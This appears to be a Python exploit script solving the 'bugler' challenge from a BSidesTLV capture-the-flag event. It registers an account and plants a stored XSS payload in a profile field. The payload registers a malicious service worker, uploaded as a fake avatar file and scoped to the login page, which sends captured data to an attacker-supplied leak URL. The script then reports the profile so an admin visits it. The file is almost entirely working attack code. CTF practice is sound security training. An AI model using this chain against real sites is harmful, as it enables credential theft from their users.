import re
import requests
from string import Template
from argparse import ArgumentParser
from requests.sessions import urljoin

session = requests.Session()
session.verify = False


def register(app_url="https://bugler.ctf.bsidestlv.com/", username="realgam3", password="realgam3realgam3"):
    register_url = urljoin(app_url, "/register")
    res = session.post(
        url=register_url,
        data={
            "username": username,
            "password": password,
            "email": f"{username}@gmail.com"
        }
    )
    return res.url != register_url


def login(app_url="https://bugler.ctf.bsidestlv.com/", username="realgam3", password="realgam3realgam3"):
    login_url = urljoin(app_url, "/login")
    res = session.post(
        url=login_url,
        data={
            "username": username,
            "password": password,
        }
    )
    return res.url != login_url


def exploit(leak_url, csrf_url="http://realgame.co.il/bugler.html", app_url="https://bugler.ctf.bsidestlv.com/",
            username="realgam3", password="realgam3realgam3"):
    # Register / Login
    if not register(username=username, password=password):
        if not login(username=username, password=password):
            raise Exception("Bad username or password!")

    # Update Profile
    profile_url = urljoin(app_url, "/profile")
    res = session.post(
        url=profile_url,
        data={
            "first_name": "first_name",
            "last_name": "last_name",
            "website": csrf_url,
            "city": "City",
            "address": (
                "<script>navigator.serviceWorker.register("
                "   document.querySelector('.profile').src, {scope: '/login'}"
                ").then(function() {"
                "   window.location.replace('/logout');"
                "});</script>"
            ),
        },
        files={
            "avatar": (
                "service_worker.js",
                Template(open('service_worker.js').read()).safe_substitute(exfil_url=leak_url),
                'text/javascript'
            )
        },
        proxies={"https": "http://127.0.0.1:8888"}
    )
    re_res = re.search(r'<a href="/profile/(?P<uid>[^"]*?)">', res.text)
    if not re_res:
        raise Exception("Profile update failed!")

    # Report Phishing on yourself
    uid = re_res.group("uid")
    res = session.get(
        url=urljoin(app_url, "/report/%s" % uid),
    )
    if not res.ok:
        res.raise_for_status()

    res_json = res.json()
    if res_json["reported"]:
        return print("Exploit succeed!")

    print("Exploit Failed (Maybe bad URL)")


if __name__ == "__main__":
    parser = ArgumentParser()

    # Proxy Configuration
    parser.add_argument("-u", "--username",
                        help="bugler username",
                        default="realgam3")
    parser.add_argument("-p", "--password",
                        help="bugler password",
                        default="realgam3realgam3")
    parser.add_argument("-a", "--app-url",
                        help="bugler url",
                        default="https://bugler.ctf.bsidestlv.com/")
    parser.add_argument("-c", "--csrf-url",
                        help="bugler exploit csrf url",
                        default="http://realgame.co.il/bugler.html")
    parser.add_argument("-l", "--leak-url",
                        help="bugler exploit leak url (requestbin, burp_collaborator, etc.)",
                        required=True)
    sys_args = vars(parser.parse_args())

    exploit(**sys_args)
